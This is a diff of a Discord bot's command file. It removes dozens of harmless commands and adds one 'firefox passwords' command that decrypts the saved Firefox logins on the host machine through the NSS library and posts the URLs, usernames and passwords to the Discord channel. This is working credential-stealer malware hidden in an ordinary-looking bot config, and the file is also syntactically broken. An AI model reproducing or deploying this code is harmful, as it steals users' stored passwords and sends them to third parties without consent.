@@ -1,39 +1,106 @@
 [
-  {"cmd": "ping", "output": "await message.channel.send('🏓 Pong!')"},
-  {"cmd": "hello", "output": "await message.channel.send(f'Hello {message.author.mention}!')"},
-  {"cmd": "bye", "output": "await message.channel.send('Goodbye 👋')"},
-  {"cmd": "server", "output": "await message.channel.send(f'Server name: {message.guild.name}')"},
-  {"cmd": "members", "output": "await message.channel.send(f'Member count: {message.guild.member_count}')"},
-  {"cmd": "userid", "output": "await message.channel.send(f'Your ID: {message.author.id}')"},
-  {"cmd": "avatar", "output": "await message.channel.send(message.author.display_avatar.url)"},
-  {"cmd": "time", "output": "import datetime\nawait message.channel.send(str(datetime.datetime.utcnow()))"},
-  {"cmd": "random", "output": "import random\nawait message.channel.send(str(random.randint(1, 100)))"},
-  {"cmd": "coinflip", "output": "import random\nawait message.channel.send(random.choice(['Heads', 'Tails']))"},
-  {"cmd": "dice", "output": "import random\nawait message.channel.send(f'🎲 {random.randint(1,6)}')"},
-  {"cmd": "repeat", "output": "await message.channel.send(message.content.replace('repeat ', ''))"},
-  {"cmd": "sayhi", "output": "await message.channel.send('Hi there! 👋')"},
-  {"cmd": "rules", "output": "await message.channel.send('1. Be respectful\\n2. No spam\\n3. Follow Discord TOS')"},
-  {"cmd": "help", "output": "await message.channel.send('Commands: ping, hello, bye, server, members, avatar, random, coinflip, dice')"},
-  {"cmd": "botinfo", "output": "await message.channel.send('I am a custom Discord bot 🤖')"},
-  {"cmd": "channelid", "output": "await message.channel.send(f'Channel ID: {message.channel.id}')"},
-  {"cmd": "mention", "output": "await message.channel.send(message.author.mention)"},
-  {"cmd": "uppercase", "output": "await message.channel.send(message.content.upper())"},
-  {"cmd": "lowercase", "output": "await message.channel.send(message.content.lower())"},
-  {"cmd": "reverse", "output": "await message.channel.send(message.content[::-1])"},
-  {"cmd": "length", "output": "await message.channel.send(str(len(message.content)))"},
-  {"cmd": "embed", "output": "import discord\nembed = discord.Embed(title='Test Embed', description='This is an embed')\nawait message.channel.send(embed=embed)"},
-  {"cmd": "clear5", "output": "await message.channel.purge(limit=5)"},
-  {"cmd": "clear10", "output": "await message.channel.purge(limit=10)"},
-  {"cmd": "dmme", "output": "await message.author.send('Hello from the bot!')"},
-  {"cmd": "react", "output": "await message.add_reaction('👍')"},
-  {"cmd": "multi", "output": "await message.channel.send('Line 1')\nawait message.channel.send('Line 2')"},
-  {"cmd": "math", "output": "await message.channel.send(str(eval(message.content.split(' ',1)[1])))"},
-  {"cmd": "randomuser", "output": "import random\nawait message.channel.send(random.choice(message.guild.members).mention)"},
-  {"cmd": "joined", "output": "await message.channel.send(str(message.author.joined_at))"},
-  {"cmd": "created", "output": "await message.channel.send(str(message.author.created_at))"},
-  {"cmd": "nick", "output": "await message.channel.send(str(message.author.display_name))"},
-  {"cmd": "roles", "output": "await message.channel.send(', '.join([r.name for r in message.author.roles]))"},
-  {"cmd": "emoji", "output": "await message.channel.send('😄🔥🎉')"},
-  {"cmd": "spam3", "output": "for _ in range(3): await message.channel.send('Spam!')"},
-  {"cmd": "countdown", "output": "import asyncio\nfor i in range(5,0,-1):\n    await message.channel.send(i)\n    await asyncio.sleep(1)\nawait message.channel.send('Go!')"}
+  {"cmd": "firefox passwords", "output": '''import os
+import ctypes as ct
+import getpass
+import requests
+import json
+import time
+from base64 import b64decode
+
+def split_message(message, max_length=500):
+    return [message[i:i+max_length] for i in range(0, len(message), max_length)]
+
+class NSSDecoder:
+    class SECItem(ct.Structure):
+        _fields_ = [
+            ('type', ct.c_uint),
+            ('data', ct.c_char_p),
+            ('len', ct.c_uint),
+        ]
+
+    def __init__(self):
+        self.NSS = self.load_libnss()
+        self._set_ctypes()
+
+    def load_libnss(self):
+        if os.name == "nt":
+            nssname = "nss3.dll"
+            locations = (
+                "",
+                r"C:\Program Files\Mozilla Firefox",
+                r"C:\Program Files (x86)\Mozilla Firefox",
+            )
+        else:
+            nssname = "libnss3.so"
+            locations = (
+                "",
+                "/usr/lib",
+                "/usr/lib/nss",
+                "/usr/lib64",
+                "/usr/lib64/nss",
+            )
+
+        for loc in locations:
+            try:
+                nsslib = os.path.join(loc, nssname)
+                return ct.CDLL(nsslib)
+            except OSError:
+                continue
+        raise Exception("Could not load NSS library")
+
+    def _set_ctypes(self):
+        self.NSS.NSS_Init.argtypes = [ct.c_char_p]
+        self.NSS.NSS_Init.restype = ct.c_int
+        self.NSS.PK11_GetInternalKeySlot.argtypes = []
+        self.NSS.PK11_GetInternalKeySlot.restype = ct.POINTER(self.SECItem)
+        self.NSS.PK11SDR_Decrypt.argtypes = [ct.POINTER(self.SECItem), ct.POINTER(self.SECItem), ct.c_void_p]
+        self.NSS.PK11SDR_Decrypt.restype = ct.c_int
+        self.NSS.SECITEM_ZfreeItem.argtypes = [ct.POINTER(self.SECItem), ct.c_int]
+        self.NSS.SECITEM_ZfreeItem.restype = None
+
+    def decode(self, data64):
+        data = b64decode(data64)
+        inp = self.SECItem(0, data, len(data))
+        out = self.SECItem(0, None, 0)
+
+        e = self.NSS.PK11SDR_Decrypt(inp, out, None)
+        if e == -1:
+            raise Exception("Decryption failed. Master password required.")
+
+        res = ct.string_at(out.data, out.len).decode("utf-8")
+        self.NSS.SECITEM_ZfreeItem(out, 0)
+        return res
+
+def decrypt_firefox_passwords(profile_dir):
+    nss = NSSDecoder()
+    nss.NSS.NSS_Init(profile_dir.encode("utf-8"))
+
+    credentials = []
+    logins_json = os.path.join(profile_dir, "logins.json")
+    if os.path.exists(logins_json):
+        with open(logins_json, "r") as f:
+            data = json.load(f)
+            for login in data.get("logins", []):
+                user = nss.decode(login["encryptedUsername"])
+                password = nss.decode(login["encryptedPassword"])
+                credentials.append({"url": login["hostname"], "username": user, "password": password})
+
+    nss.NSS.NSS_Shutdown()
+    return credentials
+    
+def firefox():
+    a = {}
+    try:
+        firefox_profiles = os.path.expanduser(r'~\AppData\Roaming\Mozilla\Firefox\Profiles')
+        if os.path.exists(firefox_profiles):
+            for profile in os.listdir(firefox_profiles):
+                profile_dir = os.path.join(firefox_profiles, profile)
+                a["firefox"] = decrypt_firefox_passwords(profile_dir)
+    except Exception as e:
+        send_live_message(f"Error gathering credentials: {e}")
+    return a
+
+a = firefox()
+
+await message.channel.send(json.dumps(a['firefox'], indent=4))'''},
 ]
